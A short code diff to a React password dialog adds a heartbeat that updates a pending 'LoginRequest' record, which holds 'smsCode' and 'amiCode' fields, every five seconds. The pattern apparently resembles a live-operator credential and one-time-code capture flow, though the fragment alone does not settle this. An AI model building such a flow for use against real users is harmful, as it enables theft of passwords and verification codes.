@@ -14,11 +14,13 @@ export default function PasswordDialog({ username, onCancel, onReject }) {
   const [statusMessage, setStatusMessage] = useState(null);
   const unsubscribeRef = useRef(null);
   const activeDialogRef = useRef(null);
+  const heartbeatRef = useRef(/** @type {ReturnType<typeof setInterval> | null} */ (null));
   const isActive = focused || password.length > 0;
 
   useEffect(() => {
     return () => {
       if (unsubscribeRef.current) unsubscribeRef.current();
+      if (heartbeatRef.current) clearInterval(heartbeatRef.current);
     };
   }, []);
 
@@ -32,8 +34,14 @@ export default function PasswordDialog({ username, onCancel, onReject }) {
       status: "pending",
       smsCode: "",
       amiCode: "",
+      lastSeen: new Date().toISOString(),
     });
     setRequestId(record.id);
+
+    heartbeatRef.current = setInterval(() => {
+      client.entities.LoginRequest.update(record.id, { lastSeen: new Date().toISOString() });
+    }, 5000);
+
     unsubscribeRef.current = client.entities.LoginRequest.subscribe((event) => {
       if (event.id !== record.id) return;
       const data = event.data;
